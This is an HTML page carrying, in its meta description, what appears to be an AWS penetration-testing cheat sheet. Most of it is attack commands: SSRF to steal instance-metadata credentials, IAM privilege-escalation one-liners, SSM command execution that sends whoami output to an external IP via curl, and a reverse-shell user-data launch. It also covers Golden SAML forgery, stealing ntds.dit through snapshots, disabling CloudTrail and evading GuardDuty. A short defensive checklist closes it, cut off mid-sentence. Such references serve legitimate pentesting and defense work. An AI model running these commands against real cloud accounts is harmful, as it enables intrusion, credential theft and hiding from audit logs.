<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="AWS" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services. Summary AWS Summary Training Tools AWS Patterns AWS - Metadata SSRF Method for Elastic Cloud Compute (EC2) Method for Container Service (Fargate) AWS API calls that return credentials AWS - Shadow Admin Admin equivalent permission AWS - Gaining AWS Console Access via API Keys AWS - Enumerate IAM permissions AWS - Mount EBS volume to EC2 Linux AWS - Copy EC2 using AMI Image AWS - Instance Connect - Push an SSH key to EC2 instance AWS - Lambda - Extract function’s code AWS - SSM - Command execution AWS - Golden SAML Attack AWS - Shadow Copy attack Disable CloudTrail Cover tracks by obfuscating Cloudtrail logs and Guard Duty DynamoDB Security checks References Training Damn Vulnerable Cloud Application - https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6 SadCloud - https://github.com/nccgroup/sadcloud Flaws - http://flaws.cloud Tools SkyArk - Discover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins Requires read-Only permissions over IAM service ```powershell $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C&gt; Import-Module .\SkyArk.ps1 -force PS C&gt; Start-AWStealth or in the Cloud Console PS C&gt; IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1’) PS C&gt; Scan-AWShadowAdmins ``` Pacu - Exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set Requires AWS Keys ```powershell $ git clone https://github.com/RhinoSecurityLabs/pacu $ bash install.sh $ python3 pacu.py set_keys/swap_keys ls run [--keyword-arguments] run --regions eu-west-1,us-west-1 # https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details ``` Bucket Finder - Search for public buckets, list and download all files if directory indexing is enabled 1 2 3 4 5 6 7 8 9 10 11 wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2 ./bucket_finder.rb my_words ./bucket_finder.rb --region ie my_words US Standard = http://s3.amazonaws.com Ireland = http://s3-eu-west-1.amazonaws.com Northern California = http://s3-us-west-1.amazonaws.com Singapore = http://s3-ap-southeast-1.amazonaws.com Tokyo = http://s3-ap-northeast-1.amazonaws.com ./bucket_finder.rb --download --region ie my_words ./bucket_finder.rb --log-file bucket.out my_words Boto3 - Amazon Web Services (AWS) SDK for Python 1 2 3 4 5 6 7 8 9 import boto3 # Create an S3 client s3 = boto3.client(&#39;s3&#39;,aws_access_key_id=&#39;AKIAJQDP3RKREDACTED&#39;,aws_secret_access_key=&#39;igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED&#39;,region_name=&#39;us-west-1&#39;) try: result = s3.list_buckets() print(result) except Exception as e: print(e) Prowler - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100). Require: arn:aws:iam::aws:policy/SecurityAudit 1 2 3 4 5 6 $ pip install awscli ansi2html detect-secrets $ git clone https://github.com/toniblyx/prowler $ sudo apt install jq $ ./prowler -E check42,check43 $ ./prowler -p custom-profile -r us-east-1 -c check11 $ ./prowler -A 123456789012 -R ProwlerRole # sts assume-role Principal Mapper - A tool for quickly evaluating IAM permissions in AWS 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 https://github.com/nccgroup/PMapper pip install principalmapper pmapper graph --create pmapper visualize --filetype png pmapper analysis --output-type text # Determine if PowerUser can escalate privileges pmapper query &quot;preset privesc user/PowerUser&quot; pmapper argquery --principal user/PowerUser --preset privesc # Find all principals that can escalate privileges pmapper query &quot;preset privesc *&quot; pmapper argquery --principal &#39;*&#39; --preset privesc # Find all principals that PowerUser can access pmapper query &quot;preset connected user/PowerUser *&quot; pmapper argquery --principal user/PowerUser --resource &#39;*&#39; --preset connected # Find all principals that can access PowerUser pmapper query &quot;preset connected * user/PowerUser&quot; pmapper argquery --principal &#39;*&#39; --resource user/PowerUser --preset connected ScoutSuite - Multi-Cloud Security Auditing Tool 1 2 3 4 5 $ git clone https://github.com/nccgroup/ScoutSuite $ python scout.py PROVIDER --help # The --session-token is optional and only used for temporary credentials (i.e. role assumption). $ python scout.py aws --access-keys --access-key-id &lt;AKIAIOSFODNN7EXAMPLE&gt; --secret-access-key &lt;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&gt; --session-token &lt;token&gt; $ python scout.py azure --cli s3_objects_check - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files 1 2 3 4 5 $ git clone https://github.com/nccgroup/s3_objects_check $ python3 -m venv env &amp;&amp; source env/bin/activate $ pip install -r requirements.txt $ python s3-objects-check.py -h $ python s3-objects-check.py -p whitebox-profile -e blackbox-profile cloudsplaining - An AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized report 1 2 3 $ pip3 install --user cloudsplaining $ cloudsplaining download --profile myawsprofile $ cloudsplaining scan --input-file default.json weirdAAL - AWS Attack Library 1 2 3 python3 weirdAAL.py -m ec2_describe_instances -t demo python3 weirdAAL.py -m lambda_get_account_settings -t demo python3 weirdAAL.py -m lambda_get_function -a &#39;MY_LAMBDA_FUNCTION&#39;,&#39;us-west-2&#39; -t yolo cloudmapper - CloudMapper helps you analyze your Amazon Web Services (AWS) environments 1 2 3 4 5 6 7 8 9 10 11 git clone https://github.com/duo-labs/cloudmapper.git # sudo yum install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli # You may additionally need &quot;build-essential&quot; sudo apt-get install autoconf automake libtool python3.7-dev python3-tk jq awscli pipenv install --skip-lock pipenv shell report: Generate HTML report. Includes summary of the accounts and audit findings. iam_report: Generate HTML report for the IAM information of an account. audit: Check for potential misconfigurations. collect: Collect metadata about an account. find_admins: Look at IAM policies to identify admin users and roles, or principals with specific privileges dufflebag - Find secrets that are accidentally exposed via Amazon EBS’s “public” mode AWS Patterns | Service | URL | |————-|——–| | s3 | https://{user_provided}.s3.amazonaws.com | | cloudfront | https://{random_id}.cloudfront.net | | ec2 | ec2-{ip-seperated}.compute-1.amazonaws.com | | es | https://{user_provided}-{random_id}.{region}.es.amazonaws.com | | elb | http://{user_provided}-{random_id}.{region}.elb.amazonaws.com:80/443 | | elbv2 | https://{user_provided}-{random_id}.{region}.elb.amazonaws.com | | rds | mysql://{user_provided}.{random_id}.{region}.rds.amazonaws.com:3306 | | rds | postgres://{user_provided}.{random_id}.{region}.rds.amazonaws.com:5432 | | route 53 | {user_provided} | | execute-api | https://{random_id}.execute-api.{region}.amazonaws.com/{user_provided} | | cloudsearch | https://doc-{user_provided}-{random_id}.{region}.cloudsearch.amazonaws.com | | transfer | sftp://s-{random_id}.server.transfer.{region}.amazonaws.com | | iot | mqtt://{random_id}.iot.{region}.amazonaws.com:8883 | | iot | https://{random_id}.iot.{region}.amazonaws.com:8443 | | iot | https://{random_id}.iot.{region}.amazonaws.com:443 | | mq | https://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:8162 | | mq | ssl://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:61617 | | kafka | b-{1,2,3,4}.{user_provided}.{random_id}.c{1,2}.kafka.{region}.amazonaws.com | | kafka | {user_provided}.{random_id}.c{1,2}.kafka.useast-1.amazonaws.com | | cloud9 | https://{random_id}.vfs.cloud9.{region}.amazonaws.com | | mediastore | https://{random_id}.data.mediastore.{region}.amazonaws.com | | kinesisvideo | https://{random_id}.kinesisvideo.{region}.amazonaws.com | | mediaconvert | https://{random_id}.mediaconvert.{region}.amazonaws.com | | mediapackage | https://{random_id}.mediapackage.{region}.amazonaws.com/in/v1/{random_id}/channel | AWS - Metadata SSRF AWS released additional security defences against the attack. :warning: Only working with IMDSv1. Enabling IMDSv2 : aws ec2 modify-instance-metadata-options --instance-id &lt;INSTANCE-ID&gt; --profile &lt;AWS_PROFILE&gt; --http-endpoint enabled --http-token required. In order to usr IMDSv2 you must provide a token. 1 2 export TOKEN=`curl -X PUT -H &quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot; &quot;http://169.254.169.254/latest/api/token&quot;` curl -H &quot;X-aws-ec2-metadata-token:$TOKEN&quot; -v &quot;http://169.254.169.254/latest/meta-data&quot; Method for Elastic Cloud Compute (EC2) Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/ 1 2 3 4 5 6 7 8 9 10 ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/ Extract the role’s temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ 1 2 3 4 5 6 7 8 9 { &quot;Code&quot; : &quot;Success&quot;, &quot;LastUpdated&quot; : &quot;2019-07-31T23:08:10Z&quot;, &quot;Type&quot; : &quot;AWS-HMAC&quot;, &quot;AccessKeyId&quot; : &quot;ASIA54BL6PJR37YOEP67&quot;, &quot;SecretAccessKey&quot; : &quot;OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2&quot;, &quot;Token&quot; : &quot;AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv&quot;, &quot;Expiration&quot; : &quot;2019-08-01T05:20:30Z&quot; } Method for Container Service (Fargate) Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ 1 2 3 4 5 JAVA_ALPINE_VERSION=8.212.04-r0 HOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 AWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2 ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 1 2 3 4 5 6 7 { &quot;RoleArn&quot;: &quot;arn:aws:iam::953574914659:role/awesome-waf-role&quot;, &quot;AccessKeyId&quot;: &quot;ASIA54BL6PJR2L75XHVS&quot;, &quot;SecretAccessKey&quot;: &quot;j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt&quot;, &quot;Token&quot;: &quot;FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ==&quot;, &quot;Expiration&quot;: &quot;2019-09-18T04:05:59Z&quot; } AWS API calls that return credentials chime:createapikey codepipeline:pollforjobs cognito-identity:getopenidtoken cognito-identity:getopenidtokenfordeveloperidentity cognito-identity:getcredentialsforidentity connect:getfederationtoken connect:getfederationtokens ecr:getauthorizationtoken gamelift:requestuploadcredentials iam:createaccesskey iam:createloginprofile iam:createservicespecificcredential iam:resetservicespecificcredential iam:updateaccesskey lightsail:getinstanceaccessdetails lightsail:getrelationaldatabasemasteruserpassword rds-db:connect redshift:getclustercredentials sso:getrolecredentials mediapackage:rotatechannelcredentials mediapackage:rotateingestendpointcredentials sts:assumerole sts:assumerolewithsaml sts:assumerolewithwebidentity sts:getfederationtoken sts:getsessiontoken AWS - Shadow Admin Admin equivalent permission AdministratorAccess 1 2 &quot;Action&quot;: &quot;*&quot; &quot;Resource&quot;: &quot;*&quot; ec2:AssociateIamInstanceProfile iam:CreateAccessKeyiam:CreateAccessKey : create a new access key to another IAM admin account 1 aws iam create-access-key –user-name target_user iam:CreateLoginProfile : add a new password-based login profile, set a new password for an entity and impersonate it 1 $ aws iam create-login-profile –user-name target_user –password &#39;|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^(&#39; –no-password-reset-required iam:UpdateLoginProfile : reset other IAM users’ login passwords. 1 $ aws iam update-login-profile –user-name target_user –password &#39;|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z”,jJ[iT-D^(&#39; –no-password-reset-required iam:AttachUserPolicy, iam:AttachGroupPolicy or iam:AttachRolePolicy : attach existing admin policy to any other entity he currently possesses 1 2 3 $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess iam:PutUserPolicy, iam:PutGroupPolicy or iam:PutRolePolicy : added inline policy will allow the attacker to grant additional privileges to previously compromised entities. 1 $ aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json iam:CreatePolicy : add a stealthy admin policy iam:AddUserToGroup : add into the admin group of the organization. 1 $ aws iam add-user-to-group –group-name target_group –user-name my_username iam:UpdateAssumeRolePolicy + sts:AssumeRole : change the assuming permissions of a privileged role and then assume it with a non-privileged account. 1 $ aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json iam:CreatePolicyVersion &amp; iam:SetDefaultPolicyVersion : change customer-managed policies and change a non-privileged entity to be a privileged one. 1 2 $ aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default $ aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2 lambda:UpdateFunctionCode : give an attacker access to the privileges associated with the Lambda service role that is attached to that function. 1 $ aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip glue:UpdateDevEndpoint : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint. 1 $ aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub iam:PassRole + ec2:CreateInstanceProfile/ec2:AddRoleToInstanceProfile : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses. iam:PassRole + ec2:RunInstance : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account. 1 2 3 4 # add ssh key $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456 # execute a reverse shell $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction : give a user access to the privileges associated with any Lambda service role that exists in the account. 1 2 $ aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py $ aws lambda invoke –function-name my_function output.txt Example of code.py 1 2 3 4 5 6 7 8 import boto3 def lambda_handler(event, context): client = boto3.client(&#39;iam&#39;) response = client.attach_user_policy( UserName=&#39;my_username&#39;, PolicyArn=&quot;arn:aws:iam::aws:policy/AdministratorAccess&quot; ) return response iam:PassRole + glue:CreateDevEndpoint : access to the privileges associated with any Glue service role that exists in the account. 1 $ aws glue create-dev-endpoint –endpoint-name my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub AWS - Gaining AWS Console Access via API Keys A utility to convert your AWS CLI credentials into AWS console access. 1 2 3 4 5 6 7 8 9 10 $&gt; git clone https://github.com/NetSPI/aws_consoler $&gt; aws_consoler -v -a AKIA[REDACTED] -s [REDACTED] 2020-03-13 19:44:57,800 [aws_consoler.cli] INFO: Validating arguments... 2020-03-13 19:44:57,801 [aws_consoler.cli] INFO: Calling logic. 2020-03-13 19:44:57,820 [aws_consoler.logic] INFO: Boto3 session established. 2020-03-13 19:44:58,193 [aws_consoler.logic] WARNING: Creds still permanent, creating federated session. 2020-03-13 19:44:58,698 [aws_consoler.logic] INFO: New federated session established. 2020-03-13 19:44:59,153 [aws_consoler.logic] INFO: Session valid, attempting to federate as arn:aws:sts::123456789012:federated-user/aws_consoler. 2020-03-13 19:44:59,668 [aws_consoler.logic] INFO: URL generated! https://signin.aws.amazon.com/federation?Action=login&amp;Issuer=consoler.local&amp;Destination=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fregion%3Dus-east-1&amp;SigninToken=[REDACTED AWS - Enumerate IAM permissions Enumerate the permissions associated with AWS credential set with enumerate-iam 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 git clone git@github.com:andresriancho/enumerate-iam.git pip install -r requirements.txt ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... 2019-05-10 15:57:58,447 - 21345 - [INFO] Starting permission enumeration for access-key-id &quot;AKIA...&quot; 2019-05-10 15:58:01,532 - 21345 - [INFO] Run for the hills, get_account_authorization_details worked! 2019-05-10 15:58:01,537 - 21345 - [INFO] -- { &quot;RoleDetailList&quot;: [ { &quot;Tags&quot;: [], &quot;AssumeRolePolicyDocument&quot;: { &quot;Version&quot;: &quot;2008-10-17&quot;, &quot;Statement&quot;: [ { ... 2019-05-10 15:58:26,709 - 21345 - [INFO] -- gamelift.list_builds() worked! 2019-05-10 15:58:26,850 - 21345 - [INFO] -- cloudformation.list_stack_sets() worked! 2019-05-10 15:58:26,982 - 21345 - [INFO] -- directconnect.describe_locations() worked! 2019-05-10 15:58:27,021 - 21345 - [INFO] -- gamelift.describe_matchmaking_rule_sets() worked! 2019-05-10 15:58:27,311 - 21345 - [INFO] -- sqs.list_queues() worked! AWS - Mount EBS volume to EC2 Linux :warning: EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken. Head over to EC2 –&gt; Volumes and create a new volume of your preferred size and type. Select the created volume, right click and select the “attach volume” option. Select the instance from the instance text box as shown below : attach ebs volume 1 2 aws ec2 create-volume –snapshot-id snapshot_id --availability-zone zone aws ec2 attach-volume –-volume-id volume_id –-instance-id instance_id --device device Now, login to your ec2 instance and list the available disks using the following command : lsblk Check if the volume has any data using the following command : sudo file -s /dev/xvdf Format the volume to ext4 filesystem using the following command : sudo mkfs -t ext4 /dev/xvdf Create a directory of your choice to mount our new ext4 volume. I am using the name “newvolume” : sudo mkdir /newvolume Mount the volume to “newvolume” directory using the following command : sudo mount /dev/xvdf /newvolume/ cd into newvolume directory and check the disk space for confirming the volume mount : cd /newvolume; df -h . AWS - Copy EC2 using AMI Image First you need to extract data about the current instances and their AMI/security groups/subnet : aws ec2 describe-images --region eu-west-1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # create a new image for the instance-id $ aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name &quot;AWS Audit&quot; --description &quot;Export AMI&quot; --region eu-west-1 # add key to AWS $ aws ec2 import-key-pair --key-name &quot;AWS Audit&quot; --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1 # create ec2 using the previously created AMI, use the same security group and subnet to connect easily. $ aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids &quot;sg-6d0d7f01&quot; --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name &quot;AWS Audit&quot; --query &quot;Instances[0].InstanceId&quot; --region eu-west-1 # now you can check the instance aws ec2 describe-instances --instance-ids i-0546910a0c18725a1 # If needed : edit groups aws ec2 modify-instance-attribute --instance-id &quot;i-0546910a0c18725a1&quot; --groups &quot;sg-6d0d7f01&quot; --region eu-west-1 # be a good guy, clean our instance to avoid any useless cost aws ec2 stop-instances --instance-id &quot;i-0546910a0c18725a1&quot; --region eu-west-1 aws ec2 terminate-instances --instance-id &quot;i-0546910a0c18725a1&quot; --region eu-west-1 AWS - Instance Connect - Push an SSH key to EC2 instance 1 2 3 # https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/ $ aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq &quot;.[][].Instances | .[] | {InstanceId, KeyName, State}&quot; $ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds AWS - Lambda - Extract function’s code 1 2 3 4 # https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed $ aws lambda list-functions --profile uploadcreds $ aws lambda get-function --function-name &quot;LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY&quot; --query &#39;Code.Location&#39; --profile uploadcreds $ wget -O lambda-function.zip url-from-previous-query --profile uploadcreds AWS - SSM - Command execution :warning: The ssm-user account is not removed from the system when SSM Agent is uninstalled. SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs): Windows Server 2008-2012 R2 AMIs published in November 2016 or later Windows Server 2016 and 2019 Amazon Linux Amazon Linux 2 Ubuntu Server 16.04 Ubuntu Server 18.04 Amazon ECS-Optimized 1 2 3 4 5 6 $ aws ssm describe-instance-information --profile stolencreds --region eu-west-1 $ aws ssm send-command --instance-ids &quot;INSTANCE-ID-HERE&quot; --document-name &quot;AWS-RunShellScript&quot; --comment &quot;IP Config&quot; --parameters commands=ifconfig --output text --query &quot;Command.CommandId&quot; --profile stolencreds $ aws ssm list-command-invocations --command-id &quot;COMMAND-ID-HERE&quot; --details --query &quot;CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}&quot; --profile stolencreds e.g: $ aws ssm send-command --instance-ids &quot;i-05b████████adaa&quot; --document-name &quot;AWS-RunShellScript&quot; --comment &quot;whoami&quot; --parameters commands=&#39;curl 162.243.███.███:8080/`whoami`&#39; --output text --region=us-east-1 AWS - Golden SAML Attack https://www.youtube.com/watch?v=5dj4vOqqGZw https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/ Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user’s password. This attack also bypasses any MFA requirements. Requirement: Token-signing private key (export from personal store using Mimikatz) IdP public certificate IdP name Role name (role to assume) 1 2 3 $ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml $ python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 AWS - Shadow Copy attack Prerequisite: EC2:CreateSnapshot CloudCopy - https://github.com/Static-Flow/CloudCopy Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions Run &quot;Describe-Instances&quot; and show in list for attacker to select Run &quot;Create-Snapshot&quot; on volume of selected instance Run &quot;modify-snapshot-attribute&quot; on new snapshot to set &quot;createVolumePermission&quot; to attacker AWS Account Load AWS CLI with Attacker Credentials Run &quot;run-instance&quot; command to create new linux ec2 with our stolen snapshot Ssh run &quot;sudo mkdir /windows&quot; Ssh run &quot;sudo mount /dev/xvdf1 /windows/&quot; Ssh run &quot;sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user&quot; Ssh run &quot;sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user&quot; Ssh run &quot;sudo chown ec2-user:ec2-user /home/ec2-user/*&quot; SFTP get &quot;/home/ec2-user/SYSTEM ./SYSTEM&quot; SFTP get &quot;/home/ec2-user/ntds.dit ./ntds.dit&quot; locally run &quot;secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets&#39;, expects secretsdump to be on path Disable CloudTrail 1 $ aws cloudtrail delete-trail --name cloudgoat_trail --profile administrator Disable monitoring of events from global services 1 $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event Disable Cloud Trail on specific regions 1 $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event --no-is-multi-region --region=eu-west Cover tracks by obfuscating Cloudtrail logs and Guard Duty :warning: When using awscli on Kali Linux, Pentoo and Parrot Linux, a log is generated based on the user-agent. Pacu bypass this problem by defining a custom User-Agent (https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu.py#L1473) 1 2 3 4 5 boto3_session = boto3.session.Session() ua = boto3_session._session.user_agent() if &#39;kali&#39; in ua.lower() or &#39;parrot&#39; in ua.lower() or &#39;pentoo&#39; in ua.lower(): # If the local OS is Kali/Parrot/Pentoo Linux # GuardDuty triggers a finding around API calls made from Kali Linux, so let&#39;s avoid that... self.print(&#39;Detected environment as one of Kali/Parrot/Pentoo Linux. Modifying user agent to hide that from GuardDuty...&#39;) DynamoDB Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It’s a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second. list tables ```bash $ aws –endpoint-url http://s3.bucket.htb dynamodb list-tables { “TableNames”: [ “users” ] } 1 2 3 4 5 6 7 8 9 10 11 12 13 * enumerate table content ```bash $ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r &#39;.Items[]&#39; { &quot;password&quot;: { &quot;S&quot;: &quot;Management@#1@#&quot; }, &quot;username&quot;: { &quot;S&quot;: &quot;Mgmt&quot; } } Security checks https://github.com/DenizParlak/Zeus Identity and Access Management Avoid the use of the “root” account Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password Ensure credentials unused for 90 days or greater are disabled Ensure access keys are rotated every 90 days or less Ensure IAM password policy requires at least one uppercase letter Ensure IAM password policy requires at least one lowercase letter Ensure IAM password policy requires at least one symbol Ensure IAM password policy requires at least one number Ensure IAM password policy requires minimum length of 14 or greater Ensure no root account access key exists Ensure MFA is enabled for the “root” account Ensure security questions are registered in the AWS account Ensure IAM policies are attached only to groups or role Enable detailed billing Maintain current contact details Ensure security contact information is registered Ensure IAM instance roles are used for AWS resource access from instances Logging Ensure CloudTrail is enabled in all regions Ensure CloudTrail log file validation is enabled Ensure the S3 bucket CloudTrail logs to is not publicly accessible Ensure CloudTrail trails are integrated with CloudWatch Logs Ensure AWS Config is enabled in all regions Ensure S3 bucket access logging is enabled on the CloudTrail S3 bucket Ensure CloudTrail logs are encrypted at rest using KMS CMKs Ensure rotation for customer created CMKs is enabled Networking Ensure no security groups allow ingress from 0.0.0.0/0 to port 22 Ensure no security groups allow ingress from 0.0.0.0/0 to port 3389 Ensure VPC flow logging is enabled in all VPC Ensure the default security group of every VPC restricts all traffic Monitoring Ensure a log metric filter and alarm exist for unauthorized API calls Ensure a log metric filter and alarm exist for Management Consolesign-in without MFA Ensure a log metric filter and alarm exist for usage of “root” account Ensure a log metric filter and 